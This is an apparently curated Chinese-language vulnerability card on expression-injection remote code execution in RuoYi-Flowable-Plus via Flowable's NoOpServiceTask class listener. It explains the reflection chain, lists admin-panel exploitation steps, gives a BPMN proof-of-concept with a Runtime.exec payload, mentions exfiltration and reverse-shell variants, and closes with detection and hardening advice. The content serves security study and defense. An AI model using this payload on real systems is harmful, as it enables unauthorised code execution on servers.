---
id: web-java-expression-flowable-class-listener-field-expression-rce
title: Flowable class 类型执行监听器 + 反射实例化：给 NoOpServiceTask 的 name Expression 字段注入 ${} 触发表达式求值 RCE
type: scenario
domain: web
path: web/java/expression
technique: flowable-class-listener-field-expression-rce
aliases:
- Flowable class 监听器
- executionListener class
- NoOpServiceTask
- ClassDelegate
- DelegateExecutionListener
- Flowable 字段表达式注入
- RuoYi-Flowable-Plus 表达式注入
- BPMN 监听器 RCE
tags:
- java
- flowable
- expression-injection
- el
- bpmn
- ruoyi
- rce
cve: []
severity: high
confidence: high
affected_versions: RuoYi-Flowable-Plus v0.8.3
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V404
  verified_at: '2026-11-09T13:29:26+08:00'
  notes: 已对照原文方法一(类一)与 38 张图核对：后台表单/流程分类/模型/设计器 start 执行监听器 Java 类=org.flowable.engine.impl.test.NoOpServiceTask，注入字段 name=表达式 ${...Runtime...exec('calc.exe')}，部署后发起流程触发；图中 ListenerNotificationHelper→DefaultListenerFactory.createClassDelegateExecutionListener→ClassDelegate.notify→instantiateDelegate→ReflectUtil.instantiate+applyFieldDeclaration，DelegateExecutionListener 区分 ExecutionListener/JavaDelegate 并最终 NoOpServiceTask.execute 中 name.getValue 求值、calc 弹出，全部一致。原文明确使用版本 v0.8.3（截图依赖 flowable-engine-6.8.0），已 set-versions。无 sources/source_url/文章ID/URL，路径合法。dedup 均 new；dup-scan.json 早于建卡且无本卡 pair。
---

## 一句话结论

Flowable 的 BPMN 执行监听器支持 `class` 实现类型：引擎按类名反射实例化（要求 public 无参构造、实现 `JavaDelegate` 或 `ExecutionListener`），再把 `fieldDeclarations` 里的“表达式”字段经 `ExpressionManager` 转成 `Expression` 注入。若流程设计界面把该配置开放给后台用户，攻击者可指定 Flowable 自带的测试类 `org.flowable.engine.impl.test.NoOpServiceTask`（它实现 `JavaDelegate`，且有 `protected Expression name` 字段），在字段 `name` 中填 `${...}`；流程启动时 `NoOpServiceTask.execute()` 调用 `name.getValue(execution)` 求值，任意 EL 表达式在服务器上执行，例如反射调用 `Runtime.getRuntime().exec("calc.exe")`。

## 原理

- **监听器分派**：流程启动/流转时，`ListenerNotificationHelper#executeExecutionListeners` 遍历流程定义里的监听器，按 `implementationType` 分支：
  - `class` → `createClassDelegateExecutionListener` → `ClassDelegate`；
  - `expression` → `ExpressionExecutionListener`；
  - `delegateExpression` → `DelegateExpressionExecutionListener`；
  - `instance` → 直接取 `listener.getInstance()`；
  - `script` → `createScriptTypeExecutionListener`。
- **class 分支的实例化链**：`ClassDelegate.notify(execution)` → `getExecutionListenerInstance()` → `new DelegateExecutionListener(this.instantiateDelegate(className, fieldDeclarations))`。`instantiateDelegate` 最终进入 `AbstractClassDelegate.defaultInstantiateDelegate(className, fieldDeclarations)`：
  1. `ReflectUtil.instantiate(className)` 用反射创建对象（因此需要 public 无参构造函数）；
  2. `applyFieldDeclaration(fieldDeclarations, object)` 把字段值写入对象；表达式类型字段（`<flowable:field><flowable:expression>...`）会先经 `expressionManager.createExpression(text)` 转成 `Expression` 再 `ReflectUtil.setField`。
- **接口约束与调用**：`DelegateExecutionListener` 的 `notify` 判断被实例化的对象：若是 `ExecutionListener` 走 `ExecutionListenerInvocation`，若是 `JavaDelegate` 走 `JavaDelegateInvocation` → 调用 `delegate.execute(execution)`；两者都不实现则抛异常。因此攻击者选择的类必须实现其中之一。
- **为什么选 NoOpServiceTask**：它是 Flowable 测试包里的 `JavaDelegate` 实现，`execute()` 中有 `NAMES.add((String) this.name.getValue(execution))`；`name` 字段类型正是 `Expression`。攻击者把 `name` 字段声明为表达式并填入 `${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc.exe')}`，字段注入后 `name` 成为 `JuelExpression`，`execute()` 里 `getValue` 即触发 JUEL 求值；`getClass()`/`forName`/反射调用链让 EL 能访问任意 Java 类，无需任何特殊语法。
- **为什么能落到远程代码执行**：JUEL 表达式在流程引擎的 JVM 内执行，`''.getClass()` 得到 `String.class`，`forName('java.lang.Runtime')` 拿到 Runtime，`getMethod('getRuntime').invoke(null)` 调静态方法，最后 `exec()` 启动进程；整个过程只需流程定义可控，不依赖目标是否实现了自定义监听器。
- **前提是配置可控**：RuoYi-Flowable-Plus 把 Flowable 的流程模型设计/部署能力暴露在后台（表单构建、流程模型、部署管理、新建流程）。能进入后台上传/设计 BPMN 的用户即可写入上述监听器并部署，随后发起流程触发执行。

## 触发条件

- 目标使用 Flowable 6.x（调试环境为 flowable-engine 6.8.0），且 classpath 中存在 `org.flowable.engine.impl.test.NoOpServiceTask`（flowable-engine 测试类被打入依赖）或任意满足“public 无参构造 + 实现 JavaDelegate/ExecutionListener + 带 Expression 字段”的类。
- 攻击者能访问 BPMN 流程设计/部署功能（RuoYi-Flowable-Plus 后台账号，至少具备流程模型与部署权限）。
- 流程定义包含 start 等事件类型的执行监听器，并在保存后执行“部署”，再新建流程发起以触发监听器。
- 服务器未对 BPMN 中的 class/表达式字段做禁用或白名单校验。

## 利用步骤

1. 登录 RuoYi-Flowable-Plus 后台，进入“系统工具 → 表单构建”新建一个简单表单并保存（供流程节点绑定）。
2. 进入“流程管理 → 流程分类”新增分类；进入“流程模型”新增模型并保存（模型标识自动生成）。
3. 点击模型的“设计”，在画布中创建“开始事件”，在右侧属性面板添加“执行监听器”：
   - 事件类型：`start`
   - 监听器类型：`Java 类`
   - Java 类：`org.flowable.engine.impl.test.NoOpServiceTask`
   - 注入字段：`name`，字段类型：`表达式`，字段值：
     `${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc.exe')}`
4. 保存流程，回到流程模型列表点击“部署”，使新版本生效。
5. 进入“办公管理 → 新建流程”，找到该流程点击“发起”，随意填写表单并提交；流程启动触发 start 监听器，命令在服务器执行。
6. 若需要回显/带外，将命令替换为重定向到可读目录、curl/DNS 外带或反弹 shell 的 payload；Windows 目标可用 `calc.exe` 验证。

## PoC

等价的 BPMN 片段（部署后发起流程即触发）：

```xml
<process id="p1" isExecutable="true">
  <startEvent id="start">
    <extensionElements>
      <flowable:executionListener event="start"
          class="org.flowable.engine.impl.test.NoOpServiceTask">
        <flowable:field name="name">
          <flowable:expression>${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc.exe')}</flowable:expression>
        </flowable:field>
      </flowable:executionListener>
    </extensionElements>
  </startEvent>
  <!-- ... -->
</process>
```

字段的 key 必须与被实例化类的字段名一致（本例为 `name`）；字段类型必须是“表达式”，使 Flowable 走 `expressionManager.createExpression` 而不是按字符串原样注入。

## 变体与关联

- **expression / delegateExpression 监听器**：跳过 class 实例化，直接把 `implementation` 字符串作为 EL 求值（见关联卡），利用更短；class 监听器路径的优势是可以借用已有类中的 Expression 字段，绕过对 `implementationType=expression` 的禁用。
- **其他可复用类**：任何实现 `JavaDelegate`/`ExecutionListener` 且暴露 Expression 字段（或会在构造/字段注入/execute 中求值）的类都可作为入口；Flowable 测试包中的类在打包时可能被带入生产依赖。
- **ScriptExecutionListener**：同样通过 class 监听器指定，但字段是 script/language，走脚本引擎执行（见脚本监听器卡）。
- **关联面**：EL 注入通用原理与 SpEL/OGNL 卡相通；RuoYi 其他后台功能（定时任务 invokeTarget、SnakeYAML 等）也有类似“后台配置即代码执行”的模式。

## 检测与防御

- **权限收敛**：不要把 Flowable Modeler/流程设计、部署能力开放给非必要后台用户；对流程分类、模型、部署、发起分别做细粒度 RBAC 与审批。
- **部署时校验 BPMN**：在部署入口解析 XML，白名单限制 `implementationType`（如只允许 `delegateExpression` 指向固定 bean），禁止 `class`/`expression`/`script` 或禁止其中出现 `${}`/`#{`；对 `flowable:class` 做类名白名单（禁止 `org.flowable.engine.impl.test.*` 等测试/内部类）。
- **移除测试类**：生产依赖中剔除 flowable test-jar，避免 `NoOpServiceTask` 等测试类成为现成 gadget。
- **表达式沙箱**：使用受限的 ExpressionManager/ELResolver，禁止 `getClass`/`forName`/`getMethod`/`invoke` 等反射链；或切换到不解析任意类访问的表达式实现。
- **监控与审计**：监控 BPMN 部署事件与流程启动；告警流程定义中出现 `class=`、`expression=`、`script` 监听器；对后台新增流程模型的操作记录操作人与 XML 原文。
- **应急**：排查 `ACT_GE_BYTEARRAY`/部署表中已存在的流程定义 XML，清理可疑监听器；升级/修补 RuoYi-Flowable-Plus 对流程设计的暴露面。
